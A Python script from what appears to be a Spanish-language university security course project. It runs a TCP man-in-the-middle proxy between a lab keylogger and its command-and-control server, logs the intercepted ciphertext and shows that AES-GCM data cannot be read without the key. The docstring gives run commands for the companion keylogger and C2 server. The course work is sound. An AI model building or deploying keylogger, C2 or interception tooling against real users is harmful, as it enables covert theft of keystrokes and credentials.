#!/usr/bin/env python3
"""
=============================================================================
Proyecto Unidad 2 - Seguridad Informática
Ejercicio 3: Demo de Ataque MITM (Man-in-the-Middle)
=============================================================================

Descripción:
    Este script simula un proxy MITM que intercepta el tráfico TCP entre
    el keylogger (víctima) y el servidor C2 (atacante). Demuestra que aunque
    el tráfico sea interceptado, el contenido NO puede ser descifrado porque:

    1. El tráfico está cifrado con AES-256-GCM.
    2. Sin la clave (derivada con PBKDF2 de la semilla secreta), los datos
       parecen ruido aleatorio.
    3. Cualquier intento de modificar el ciphertext es detectado por el tag GCM
       (la víctima/atacante legítimo rechaza los datos manipulados).

Escenario de demostración (en VMs):
    VM1 (víctima)   → keylogger → puerto 9999 del "proxy MITM" (VM2 o loopback)
    VM2 (MITM)      → este script redirige al C2 real (VM3) y registra el tráfico
    VM3 (atacante)  → server.py recibe y descifra los datos

    Para demo local sin 3 VMs (loopback):
        Terminal 1: python3 server.py --port 9999
        Terminal 2: python3 mitm_demo.py --listen 8888 --forward 127.0.0.1:9999
        Terminal 3: python3 keylogger.py --server 127.0.0.1:8888 --no-persist

Uso:
    python3 mitm_demo.py [--listen PUERTO] [--forward HOST:PUERTO]

Requerimientos:
    Solo librería estándar de Python (no necesita cryptography aquí,
    pues el MITM solo ve bytes cifrados y no puede descifrarlos).
=============================================================================
"""

import sys
import struct
import socket
import logging
import argparse
import threading
from datetime import datetime
from pathlib import Path


# Configuración por defecto
DEFAULT_LISTEN_PORT  = 8888           # el keylogger apunta a este puerto
DEFAULT_FORWARD_HOST = "192.168.56.10"   # servidor C2 real
DEFAULT_FORWARD_PORT = 9999           # servidor C2 real (server.py)
INTERCEPT_LOG        = Path("./mitm_intercept.log")


def log_intercepted(direction: str, data: bytes, from_addr: tuple):
    """
    Registra el tráfico interceptado en el log del MITM.

    Como evidencia clave del Ejercicio 3: los datos son completamente
    ilegibles sin la clave AES. El log muestra solo hexadecimal.

    Args:
        direction: "VICTIM→C2" o "C2→VICTIM".
        data:      Bytes interceptados (ciphertext).
        from_addr: Tupla (host, port) del origen.
    """
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    hex_preview = data[:64].hex()  # primeros 64 bytes en hex

    log_entry = (
        f"\n{'='*60}\n"
        f"[MITM INTERCEPTADO] {timestamp}\n"
        f"Dirección: {direction} | Origen: {from_addr[0]}:{from_addr[1]}\n"
        f"Tamaño total: {len(data)} bytes\n"
        f"Hex (primeros 64B): {hex_preview}...\n"
        f"NOTA: El contenido está cifrado con AES-256-GCM.\n"
        f"      Sin la clave derivada con PBKDF2, estos bytes son ILEGIBLES.\n"
        f"{'='*60}\n"
    )

    print(log_entry)
    with open(INTERCEPT_LOG, "a") as f:
        f.write(log_entry)


def attempt_decrypt_without_key(data: bytes):
    """
    Intenta descifrar los datos interceptados SIN la clave correcta.
    Demuestra que el MITM no puede leer el contenido.

    Args:
        data: Bytes cifrados interceptados.
    """
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.exceptions import InvalidTag

    print("[MITM] Intentando descifrar con clave INCORRECTA...")

    # Intentar con una clave aleatoria
    wrong_key = b"A" * 32
    aesgcm    = AESGCM(wrong_key)
    nonce     = data[:12]
    ct        = data[12:]

    try:
        aesgcm.decrypt(nonce, ct, None)
        print("[MITM] ERROR: Descifrado exitoso con clave incorrecta (esto no debería pasar)")
    except InvalidTag:
        print("[MITM] ✓ CONFIRMADO: Tag GCM inválido con clave incorrecta.")
        print("[MITM]   El contenido interceptado es ILEGIBLE sin la clave correcta.")
        print("[MITM]   Esto demuestra que AES-256-GCM protege contra ataques MITM.\n")
    except Exception as e:
        print(f"[MITM] Error al intentar descifrar: {e}\n")


class MITMProxy(threading.Thread):
    """
    Proxy TCP transparente que:
        1. Acepta la conexión del keylogger (víctima).
        2. Abre una conexión al servidor C2 real (forward).
        3. Reenvía todos los datos en ambas direcciones.
        4. Registra (intercepta) los datos que ve.
        5. Intenta descifrar para demostrar que NO puede hacerlo.
    """

    def __init__(self, victim_conn: socket.socket, victim_addr: tuple,
                 forward_host: str, forward_port: int):
        """
        Args:
            victim_conn:  Socket de la conexión del keylogger.
            victim_addr:  Dirección (host, port) de la víctima.
            forward_host: Host del servidor C2 real.
            forward_port: Puerto del servidor C2 real.
        """
        super().__init__(daemon=True)
        self._victim_conn  = victim_conn
        self._victim_addr  = victim_addr
        self._forward_host = forward_host
        self._forward_port = forward_port

    def run(self):
        """
        Maneja el flujo de datos víctima ↔ C2 con interceptación.
        """
        client_ip = self._victim_addr[0]
        print(f"\n[MITM] Nueva conexión interceptada desde {client_ip}:{self._victim_addr[1]}")

        try:
            # Conectar al C2 real
            c2_sock = socket.create_connection(
                (self._forward_host, self._forward_port), timeout=10
            )
            print(f"[MITM] Conectado al C2 real: {self._forward_host}:{self._forward_port}")

            # ---- Interceptar: leer longitud ----
            length_bytes = self._recv_exact(self._victim_conn, 4)
            if not length_bytes:
                return
            payload_length = struct.unpack(">I", length_bytes)[0]
            print(f"[MITM] Longitud del payload anunciada: {payload_length} bytes")

            # ---- Interceptar: leer payload cifrado ----
            encrypted_blob = self._recv_exact(self._victim_conn, payload_length)
            if not encrypted_blob:
                return

            # ---- INTERCEPTACIÓN: registrar y mostrar datos crudos ----
            log_intercepted("VICTIM→C2", encrypted_blob, self._victim_addr)

            # ---- DEMOSTRACIÓN: intentar descifrar sin la clave ----
            attempt_decrypt_without_key(encrypted_blob)

            # ---- Reenviar al C2 real sin modificar ----
            # (si modificáramos los bytes, el tag GCM fallaría en el servidor)
            c2_sock.sendall(length_bytes + encrypted_blob)
            print(f"[MITM] Payload reenviado al C2 real ({payload_length} bytes).")

            c2_sock.close()

        except (ConnectionRefusedError, socket.timeout) as e:
            print(f"[MITM] No se pudo conectar al C2 real: {e}")
        except Exception as e:
            print(f"[MITM] Error en proxy: {e}")
        finally:
            self._victim_conn.close()

    def _recv_exact(self, sock: socket.socket, n: int) -> bytes | None:
        """
        Recibe exactamente n bytes del socket.

        Args:
            sock: Socket del que leer.
            n:    Número de bytes a recibir.

        Returns:
            bytes o None si la conexión se cerró.
        """
        data = b""
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data


def run_mitm_proxy(listen_port: int, forward_host: str, forward_port: int):
    """
    Inicia el proxy MITM que escucha conexiones del keylogger.

    Args:
        listen_port:  Puerto donde el MITM escucha (víctima apunta aquí).
        forward_host: Host del servidor C2 real.
        forward_port: Puerto del servidor C2 real.
    """
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind(("0.0.0.0", listen_port))
    server_sock.listen(5)

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║         PROXY MITM - Interceptador de Tráfico               ║
║  Escuchando en:  0.0.0.0:{listen_port:<45}║
║  Redirigiendo a: {forward_host}:{forward_port:<44}║
║  Log de intercepción: {str(INTERCEPT_LOG):<38}║
╚══════════════════════════════════════════════════════════════╝

OBJETIVO: Demostrar que aunque el tráfico sea interceptado,
el contenido cifrado con AES-256-GCM NO puede ser leído.

[*] Esperando conexiones del keylogger... (Ctrl+C para detener)
""")

    try:
        while True:
            conn, addr = server_sock.accept()
            proxy = MITMProxy(conn, addr, forward_host, forward_port)
            proxy.start()
    except KeyboardInterrupt:
        print("\n[*] MITM proxy detenido.")
    finally:
        server_sock.close()


def parse_args() -> argparse.Namespace:
    """
    Parsea argumentos de línea de comandos.

    Returns:
        argparse.Namespace: Argumentos parseados.
    """
    parser = argparse.ArgumentParser(
        description="Demo MITM - Interceptador de tráfico del keylogger"
    )
    parser.add_argument(
        "--listen",
        type=int,
        default=DEFAULT_LISTEN_PORT,
        help=f"Puerto donde escucha el MITM (default: {DEFAULT_LISTEN_PORT})"
    )
    parser.add_argument(
        "--forward",
        type=str,
        default=f"{DEFAULT_FORWARD_HOST}:{DEFAULT_FORWARD_PORT}",
        help=f"Servidor C2 real en HOST:PUERTO (default: {DEFAULT_FORWARD_HOST}:{DEFAULT_FORWARD_PORT})"
    )
    return parser.parse_args()


def main():
    """
    Función principal del proxy MITM.
        1. Parsea argumentos.
        2. Extrae host:port del C2 real.
        3. Inicia el proxy.
    """
    args = parse_args()
    try:
        fwd_host, fwd_port_str = args.forward.rsplit(":", 1)
        fwd_port = int(fwd_port_str)
    except ValueError:
        print(f"[ERROR] Formato inválido para --forward: {args.forward}")
        sys.exit(1)

    run_mitm_proxy(args.listen, fwd_host, fwd_port)


if __name__ == "__main__":
    main()
